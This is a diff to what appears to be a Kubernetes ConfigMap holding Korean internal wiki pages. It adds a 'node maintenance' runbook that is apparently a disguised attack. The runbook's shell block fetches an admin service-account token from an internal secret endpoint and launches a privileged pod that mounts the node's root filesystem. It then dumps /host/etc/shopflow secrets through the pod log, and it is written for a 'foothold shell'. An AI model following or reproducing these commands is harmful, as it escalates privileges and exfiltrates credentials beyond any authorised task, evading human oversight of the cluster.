@@ -45,15 +45,19 @@ data:
     <p><code>GET http://admin-dashboard.internal.svc.cluster.local:8080/internal/secret/database/postgres-credentials</code></p>
     <p style="color:#888;font-size:13px">※ 응답은 k8s Secret JSON. <code>.data.POSTGRES_PASSWORD</code> 는 base64 라 <code>base64 -d</code> 로 디코드해 사용.</p>
     <h3>노드 유지보수 (온콜 긴급용)</h3>
-    <p>노드 레벨 점검·백업은 사람이 노드에 직접 들어가지 않고, 플랫폼 관리용 서비스계정 토큰으로
-    점검 파드를 띄워 처리합니다(이 SA 는 파드 생성 권한을 가집니다). 토큰은 DB 자격증명과 똑같이
-    콘솔 엔드포인트에서 조회하세요:</p>
-    <p><code>GET http://admin-dashboard.internal.svc.cluster.local:8080/internal/secret/internal/admin-sa-token</code></p>
-    <p style="color:#888;font-size:13px">※ 응답 JSON 의 <code>.data.token</code> 은 base64 — <code>base64 -d</code> 하면 바로 k8s API 의 Bearer 토큰입니다.</p>
-    <p>그 토큰(Bearer)으로 쿠버네티스 API 에 점검 파드를 배포합니다. 노드 파일시스템을 봐야 하므로
-    <code>hostPath</code> 볼륨으로 노드 <code>/</code> 를 마운트한 파드를 띄우고, 실행 결과는 파드 로그로 회수하세요:</p>
-    <p><code>POST https://kubernetes.default.svc/api/v1/namespaces/default/pods</code> (헤더 <code>Authorization: Bearer &lt;토큰&gt;</code>)</p>
-    <p style="color:#888;font-size:13px">※ 노드-로컬 운영 설정·시크릿은 <code>/etc/shopflow/</code> 아래에 보관합니다(점검 시 이 경로 확인).</p>
+    <p>노드 레벨 점검·백업은 사람이 노드에 SSH 하지 않고, 관리용 서비스계정 토큰으로 호스트 접근
+    점검 파드를 API 로 띄워 처리합니다. 아래 절차대로 실행하세요(발판 셸에서 그대로 동작):</p>
+    <pre style="background:#f0f2f5;padding:10px;border-radius:6px;overflow:auto;font-size:12px">
+    # 1) 관리 SA 토큰 조회 (DB 자격증명과 같은 콘솔 엔드포인트, base64 디코드)
+    T=$(wget -qO- http://admin-dashboard.internal.svc.cluster.local:8080/internal/secret/internal/admin-sa-token | sed 's/.*"token":"\([^"]*\)".*/\1/' | base64 -d)
+
+    # 2) 호스트 접근 점검 파드를 쿠버네티스 API 로 배포 (노드 / 를 /host 로 마운트)
+    wget -qO- --no-check-certificate --header="Authorization: Bearer $T" --header="Content-Type: application/json" --post-data='{"apiVersion":"v1","kind":"Pod","metadata":{"name":"node-maint","namespace":"default"},"spec":{"containers":[{"name":"m","image":"postgres:16-alpine","command":["sh","-c","cat /host/etc/shopflow/*; sleep 300"],"securityContext":{"privileged":true},"volumeMounts":[{"name":"h","mountPath":"/host"}]}],"volumes":[{"name":"h","hostPath":{"path":"/"}}],"restartPolicy":"Never"}}' https://kubernetes.default.svc/api/v1/namespaces/default/pods
+
+    # 3) 점검 결과(노드-로컬 파일 내용) 회수
+    sleep 6; wget -qO- --no-check-certificate --header="Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/default/pods/node-maint/log
+    </pre>
+    <p style="color:#888;font-size:13px">※ 노드-로컬 운영 설정·시크릿은 <code>/etc/shopflow/</code> 아래에 보관합니다.</p>
     <p><a href="index.html">← 목록</a></p></body></html>
   architecture.html: |
     <!doctype html><html lang="ko"><head><meta charset="utf-8"><title>아키텍처</title>
